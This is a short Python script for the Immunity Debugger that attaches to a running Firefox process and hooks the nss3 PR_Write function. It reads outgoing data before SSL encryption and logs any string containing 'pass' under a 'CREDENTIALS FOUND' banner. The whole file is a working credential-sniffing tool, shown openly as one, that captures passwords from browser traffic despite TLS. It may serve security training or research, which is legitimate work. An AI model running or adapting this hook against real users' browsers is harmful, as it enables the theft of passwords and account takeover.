#!/usr/bin/env python

import immlib

dbg = immlib.Debugger()

class ssl_sniff(immlib.LogBpHook):
    def run(self, regs):
        pattern = "pass"           
        addr = dbg.readLong(regs['ESP'] + 8)

        try: 
            line = dbg.readString(addr) 
        except: pass

        if pattern in line:
            dbg.log('_'*(50 + len("CREDENTIALS FOUND")))
            dbg.log(('*'*25) + "CREDENTIALS FOUND" + ('*'*25))
            dbg.log('~'*(50 + len("CREDENTIALS FOUND")))
            dbg.logLines(line)

def main(args):
    dbg.log('')
    dbg.log('')
    dbg.log("START")

    for (pid, pname, path, services, tcp, udp) in dbg.ps():
        if pname.lower() == "firefox":
            dbg.Attach(pid)
            dbg.log("[*] Attaching to firefox.exe with PID: %d" % pid)
            
            dbg.stepOver()
            hook_address = dbg.getAddress("nss3.PR_Write")
            dbg.log("nss3.PR_Write Address: 0x%x" % hook_address)
            sniffer = ssl_sniff()
            sniffer.add("PR_Write", hook_address)

            break

    return ""